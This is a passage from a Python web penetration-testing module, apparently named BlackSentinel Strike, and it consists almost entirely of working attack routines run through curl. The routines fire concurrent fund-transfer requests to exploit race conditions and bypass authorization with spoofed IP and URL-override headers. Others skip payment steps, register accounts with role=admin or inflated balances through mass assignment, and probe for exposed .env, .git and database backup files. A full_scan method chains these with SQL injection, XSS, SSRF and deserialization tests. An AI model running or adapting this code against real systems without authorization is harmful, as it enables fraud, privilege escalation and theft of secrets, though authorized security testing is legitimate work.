            results.append("  - Coupon/discount code reuse")
            results.append("  - Race conditions on discount application")
            final = "\n".join(results)
            self._log_action("logic_price_manipulation", target, final)
            return final
        except Exception as e:
            return f"[ERROR] logic_price_manipulation failed: {str(e)}"

    def logic_race_condition(
        self, target: str, url: str = "", endpoint: str = "/api/transfer", amount: str = "1000", threads: int = 10
    ) -> str:
        """Test for race condition vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, endpoint)
            results = []
            results.append(f"[*] Race Condition Test against: {url}")
            results.append(f"[*] Threads: {threads} | Amount: {amount}\n")
            curl_cmds = []
            for i in range(threads):
                cmd = (
                    f"{self.tool_paths['curl']} -s -X POST "
                    f'-d "amount={amount}&action=transfer" '
                    f'-H "Content-Type: application/x-www-form-urlencoded" '
                    f'-o /dev/null -w "%{{http_code}}\\n" '
                    f"{shlex.quote(url)}"
                )
                curl_cmds.append(cmd)
            batch_cmd = " & ".join(curl_cmds) + " & wait"
            results.append(f"[*] Executing {threads} concurrent requests...")
            output = self.run_command(batch_cmd, timeout=30)
            status_codes = output.strip().split("\n")
            success_count = sum(1 for s in status_codes if s.strip() == "200")
            results.append("\nResults:")
            results.append(f"  Total requests: {threads}")
            results.append(f"  Successful (200): {success_count}")
            results.append(f"  Failed: {threads - success_count}")
            if success_count > 1:
                results.append("\n[!] Race condition may be possible!")
                results.append("    Multiple requests succeeded simultaneously")
            else:
                results.append("\n  -> No obvious race condition")
            results.append("\n[*] Race condition targets:")
            results.append("  - Fund transfers / wallet operations")
            results.append("  - Coupon/discount redemption")
            results.append("  - Account creation / registration")
            results.append("  - Limited quantity purchases")
            results.append("  - Vote/like mechanisms")
            final = "\n".join(results)
            self._log_action("logic_race_condition", target, final)
            return final
        except Exception as e:
            return f"[ERROR] logic_race_condition failed: {str(e)}"

    def logic_authorization_bypass(
        self, target: str, url: str = "", endpoint: str = "/api/admin", user_token: str = "", admin_token: str = ""
    ) -> str:
        """Test for authorization/IDOR vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, endpoint)
            results = []
            results.append(f"[*] Authorization Bypass Test against: {url}\n")
            auth_headers = [
                ({"Authorization": f"Bearer {user_token}"}, "User Token"),
                ({"Authorization": f"Bearer {admin_token}"}, "Admin Token"),
                ({}, "No Auth"),
                ({"Authorization": "Bearer invalid_token"}, "Invalid Token"),
                ({"Authorization": "Bearer null"}, "Null Token"),
                ({"X-Forwarded-For": "127.0.0.1"}, "Internal IP Spoof"),
                ({"X-Real-IP": "127.0.0.1"}, "Real IP Spoof"),
                ({"X-Original-URL": "/admin"}, "Original URL Override"),
                ({"X-Rewrite-URL": "/admin"}, "Rewrite URL Override"),
                ({"X-Custom-IP-Authorization": "127.0.0.1"}, "Custom IP Auth"),
            ]
            for headers, name in auth_headers:
                header_args = " ".join(f"-H {shlex.quote(f'{k}: {v}')}" for k, v in headers.items())
                cmd = f'{self.tool_paths["curl"]} -s -w "\\n%{{http_code}}" {header_args} {shlex.quote(url)}'
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                status = lines[-1] if lines else "N/A"
                body = "\n".join(lines[:-1])
                results.append(f"  {name}: HTTP {status}")
                if status == "200":
                    results.append("    [!] Access granted - possible authorization bypass!")
            results.append("\n[*] Also test IDOR by modifying:")
            results.append("  - User IDs in URLs (/api/user/1 -> /api/user/2)")
            results.append("  - Resource IDs in parameters")
            results.append("  - UUIDs / sequential IDs")
            final = "\n".join(results)
            self._log_action("logic_authorization_bypass", target, final)
            return final
        except Exception as e:
            return f"[ERROR] logic_authorization_bypass failed: {str(e)}"

    def logic_workflow_bypass(
        self, target: str, url: str = "", endpoint: str = "/api/order", skip_steps: str = "payment"
    ) -> str:
        """Test for workflow/business logic step skipping."""
        try:
            if not url:
                url = self._build_target_url(target, endpoint)
            results = []
            results.append(f"[*] Workflow Bypass Test against: {url}\n")
            workflow_tests = [
                {
                    "name": "Skip Payment Step",
                    "data": "status=completed&step=confirmation",
                    "method": "POST",
                },
                {
                    "name": "Direct Admin Access",
                    "data": "role=admin&action=approve",
                    "method": "POST",
                },
                {
                    "name": "Status Manipulation",
                    "data": "order_status=delivered&payment_status=paid",
                    "method": "PUT",
                },
                {
                    "name": "Step Replay Attack",
                    "data": "step=verify&token=used_token",
                    "method": "POST",
                },
                {
                    "name": "Force State Transition",
                    "data": "state=approved&from=pending&to=completed",
                    "method": "POST",
                },
            ]
            for test in workflow_tests:
                cmd = (
                    f"{self.tool_paths['curl']} -s -X {test['method']} "
                    f"-d {shlex.quote(test['data'])} "
                    f'-H "Content-Type: application/x-www-form-urlencoded" '
                    f'-w "\\n%{{http_code}}" '
                    f"{shlex.quote(url)}"
                )
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                status = lines[-1] if lines else "N/A"
                body = "\n".join(lines[:-1])
                results.append(f"  {test['name']}: HTTP {status}")
                if status in ("200", "201"):
                    results.append("    [!] Step may be bypassed!")
                if "error" not in body.lower() and status == "200":
                    results.append("    [!] No validation - workflow bypass possible")
            results.append("\n[*] Common workflow bypasses:")
            results.append("  - Skip email verification")
            results.append("  - Skip payment processing")
            results.append("  - Skip approval steps")
            results.append("  - Replay completed transactions")
            results.append("  - Modify order of operations")
            final = "\n".join(results)
            self._log_action("logic_workflow_bypass", target, final)
            return final
        except Exception as e:
            return f"[ERROR] logic_workflow_bypass failed: {str(e)}"

    def logic_mass_assignment(self, target: str, url: str = "", endpoint: str = "/api/user/register") -> str:
        """Test for mass assignment / over-posting vulnerabilities."""
        try:
            if not url:
                url = self._build_target_url(target, endpoint)
            results = []
            results.append(f"[*] Mass Assignment Test against: {url}\n")
            base_data = "username=testuser123&email=test@test.com&password=TestPass123"
            escalation_fields = [
                ("role", "admin"),
                ("isAdmin", "true"),
                ("admin", "1"),
                ("is_superuser", "true"),
                ("permission_level", "999"),
                ("account_type", "premium"),
                ("balance", "1000000"),
                ("credits", "99999"),
                ("verified", "true"),
                ("approved", "true"),
                ("active", "true"),
                ("user_id", "1"),
                ("id", "1"),
            ]
            for field, value in escalation_fields:
                data = f"{base_data}&{field}={value}"
                cmd = (
                    f"{self.tool_paths['curl']} -s -X POST "
                    f"-d {shlex.quote(data)} "
                    f'-H "Content-Type: application/x-www-form-urlencoded" '
                    f'-w "\\n%{{http_code}}" '
                    f"{shlex.quote(url)}"
                )
                output = self.run_command(cmd, timeout=10)
                lines = output.strip().split("\n")
                status = lines[-1] if lines else "N/A"
                body = "\n".join(lines[:-1])
                results.append(f"  {field}={value}: HTTP {status}")
                if status in ("200", "201") and "error" not in body.lower():
                    results.append("    [!] Field may be mass-assignable!")
            results.append("\n[*] Also test with JSON payloads:")
            json_payload = '{"username":"test","email":"t@t.com","role":"admin","isAdmin":true}'
            cmd = (
                f"{self.tool_paths['curl']} -s -X POST "
                f"-d '{json_payload}' "
                f'-H "Content-Type: application/json" '
                f'-w "\\n%{{http_code}}" '
                f"{shlex.quote(url)}"
            )
            output = self.run_command(cmd, timeout=10)
            results.append(f"  JSON mass assignment: {output.strip()[-3:]}")
            results.append("\n[*] Mass assignment targets:")
            results.append("  - User registration (role escalation)")
            results.append("  - Profile updates (privilege escalation)")
            results.append("  - Order creation (price manipulation)")
            results.append("  - Settings modification (feature flags)")
            final = "\n".join(results)
            self._log_action("logic_mass_assignment", target, final)
            return final
        except Exception as e:
            return f"[ERROR] logic_mass_assignment failed: {str(e)}"

    # =========================================================================
    # UTILITY AND REPORTING METHODS
    # =========================================================================

    def generate_report(self, results: Optional[Dict[str, str]] = None, format_type: str = "text") -> str:
        """Generate a comprehensive pentest report."""
        try:
            results = results or {}
            report_lines = [
                "=" * 70,
                "BlackSentinel Strike - Web Advanced Penetration Test Report",
                "=" * 70,
                f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
                "Module: WebAdvanced",
                f"Total Tests: {len(self.session_log)}",
                "=" * 70,
                "",
                "SESSION SUMMARY:",
            ]
            method_counts = {}
            for entry in self.session_log:
                method = entry["method"]
                method_counts[method] = method_counts.get(method, 0) + 1
            for method, count in sorted(method_counts.items()):
                report_lines.append(f"  {method}: {count} execution(s)")
            report_lines.append("")
            report_lines.append("DETAILED RESULTS:")
            report_lines.append("-" * 70)
            for method_name, result in results.items():
                report_lines.append(f"\n[TEST] {method_name}")
                report_lines.append("-" * 40)
                report_lines.append(result[:2000])
            report_lines.append("\n" + "=" * 70)
            report_lines.append("END OF REPORT")
            report_lines.append("=" * 70)
            report = "\n".join(report_lines)
            filename = f"web_advanced_report_{int(time.time())}.txt"
            self._save_output(filename, report)
            return report
        except Exception as e:
            return f"[ERROR] generate_report failed: {str(e)}"

    def get_session_log(self) -> str:
        """Return formatted session log."""
        try:
            lines = []
            lines.append(f"Session Log ({len(self.session_log)} entries):")
            lines.append("-" * 60)
            for entry in self.session_log:
                ts = time.strftime("%H:%M:%S", time.localtime(entry["timestamp"]))
                lines.append(f"  [{ts}] {entry['method']} -> {entry['target']} ({entry['result_length']} bytes)")
            return "\n".join(lines)
        except Exception as e:
            return f"[ERROR] get_session_log failed: {str(e)}"

    def quick_recon(self, target: str) -> str:
        """Perform quick reconnaissance on the target."""
        try:
            results = []
            results.append(f"[*] Quick Recon against: {target}")
            url = self._build_target_url(target)
            headers_cmd = f"{self.tool_paths['curl']} -sI -L {shlex.quote(url)}"
            headers = self.run_command(headers_cmd, timeout=15)
            results.append(f"\n=== Response Headers ===\n{headers}")
            status_cmd = (
                f"{self.tool_paths['curl']} -s -o /dev/null -w "
                f'"%{{http_code}} %{{redirect_url}} %{{ssl_verify_result}}" {shlex.quote(url)}'
            )
            status = self.run_command(status_cmd, timeout=10)
            results.append(f"\n=== Status ===\n{status}")
            tech_cmd = (
                f"{self.tool_paths['curl']} -s {shlex.quote(url)} | "
                f'grep -oiE "powered.by.[a-zA-Z0-9]+|generator.*content|wp-content|drupal|joomla"'
            )
            tech = self.run_command(tech_cmd, timeout=10)
            if tech:
                results.append(f"\n=== Technology Stack ===\n{tech}")
            final = "\n".join(results)
            self._log_action("quick_recon", target, final)
            return final
        except Exception as e:
            return f"[ERROR] quick_recon failed: {str(e)}"

    def info_disclosure_scan(self, target: str) -> str:
        """Scan for information disclosure vulnerabilities."""
        try:
            results = []
            results.append(f"[*] Information Disclosure Scan against: {target}")
            url = self._build_target_url(target)
            sensitive_files = [
                "/.env",
                "/.git/config",
                "/.git/HEAD",
                "/wp-config.php.bak",
                "/config.php.bak",
                "/backup.sql",
                "/database.sql",
                "/robots.txt",
                "/sitemap.xml",
                "/.htaccess",
                "/web.config",
                "/phpinfo.php",
                "/info.php",
                "/server-status",
                "/server-info",
                "/.DS_Store",
                "/crossdomain.xml",
                "/swagger.json",
                "/openapi.json",
                "/api-docs",
                "/graphql",
                "/actuator",
                "/actuator/env",
                "/debug",
                "/trace",
            ]
            results.append(f"[*] Checking {len(sensitive_files)} sensitive paths\n")
            found = []
            for path in sensitive_files:
                test_url = self._build_target_url(target, path)
                cmd = (
                    f'{self.tool_paths["curl"]} -s -o /dev/null -w "%{{http_code}}" '
                    f"--max-time 5 {shlex.quote(test_url)}"
                )
                status = self.run_command(cmd, timeout=8).strip()
                if status in ("200", "301", "302", "403"):
                    found.append((path, status))
                    results.append(f"  [!] {path} -> HTTP {status}")
            results.append(f"\n  Found {len(found)} potentially sensitive paths")
            final = "\n".join(results)
            self._log_action("info_disclosure_scan", target, final)
            return final
        except Exception as e:
            return f"[ERROR] info_disclosure_scan failed: {str(e)}"

    def full_scan(self, target: str) -> str:
        """Run all Web Advanced scan methods against target."""
        try:
            all_results = {}
            all_results["quick_recon"] = self.quick_recon(target)
            all_results["info_disclosure"] = self.info_disclosure_scan(target)
            all_results["sqlmap_auto"] = self.sqlmap_auto_detect(target)
            all_results["xss_reflected"] = self.xss_reflected_scan(target)
            all_results["ssrf_basic"] = self.ssrf_basic_detection(target)
            all_results["deser_php"] = self.deser_php_unserialize(target)
            all_results["logic_mass"] = self.logic_mass_assignment(target)
            report = self.generate_report(all_results)
            return report
        except Exception as e:
            return f"[ERROR] full_scan failed: {str(e)}"
